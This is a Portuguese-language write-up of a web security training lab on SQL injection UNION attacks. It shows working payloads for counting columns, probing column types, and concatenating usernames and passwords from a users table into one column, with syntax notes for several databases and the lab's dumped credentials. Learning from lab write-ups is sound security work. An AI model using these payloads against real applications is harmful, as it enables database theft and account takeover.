# Lab: SQL injection UNION attack, retrieving multiple values in a single column

## Enunciado (traduzido)

Este lab contém uma vulnerabilidade de SQL injection no filtro de categoria de produtos. Os resultados da query são retornados na resposta da aplicação, permitindo usar um ataque UNION para recuperar dados de outras tabelas.

O banco de dados contém uma tabela diferente chamada `users`, com colunas chamadas `username` e `password`.

Para resolver o lab, realize um ataque de SQL injection UNION que recupere todos os nomes de usuário e senhas, e utilize essas informações para fazer login como o usuário `administrator`.

## O que fiz

Neste cenário, nos deparamos com uma limitação muito comum: precisamos extrair dois dados diferentes (`username` e `password`), mas a query original possui apenas **uma** coluna que aceita o tipo de dado texto (string).

Para contornar isso, podemos **concatenar** (juntar) os dois valores em uma única string antes que o banco a retorne.

Começamos identificando a quantidade de colunas e quais delas aceitam texto:

```sql
.../filter?category=Gifts' ORDER BY 1--
.../filter?category=Gifts' ORDER BY 2--
.../filter?category=Gifts' ORDER BY 3--
```

A consulta falhou no `3`, confirmando que temos **2 colunas**.

Testando a compatibilidade de tipo:

```sql
.../filter?category=Gifts' UNION SELECT 'a', NULL--   (Falhou: Coluna 1 não aceita texto)
.../filter?category=Gifts' UNION SELECT NULL, 'a'--   (Sucesso: Coluna 2 aceita texto)
```

Apenas a segunda coluna é capaz de exibir texto na tela.

Para trazer o nome de usuário e a senha juntos nessa única coluna, usamos o operador de concatenação de strings `||` (padrão em bancos como PostgreSQL e Oracle) junto com um caractere separador (como `~` ou `:`), facilitando a leitura de onde termina o usuário e onde começa a senha:

```sql
.../filter?category=Gifts' UNION SELECT NULL, username || '~' || password FROM users--
```

> **Nota sobre concatenação em outros bancos:**  
> - **Oracle / PostgreSQL / SQLite:** usa `||` (ex: `username || '~' || password`)  
> - **MySQL:** usa a função `CONCAT()` (ex: `CONCAT(username, '~', password)`)  
> - **SQL Server (MSSQL):** usa `+` (ex: `username + '~' + password`)

Ao enviar o payload, o banco concatenou os dados e a página exibiu a lista com as credenciais unificadas:

```
administrator~zq1eh2pc07rz08vzxn9w
carlos~tjvga41u6mpuqpqd8wh4
wiener~ohh9kdhgx73vn8d9xmlh
```

Com a senha do `administrator` (`zq1eh2pc07rz08vzxn9w`) em mãos, basta acessar a página de login (`/login`), autenticar-se e o lab é finalizado.

---

[⬅ Voltar](../../../README.md)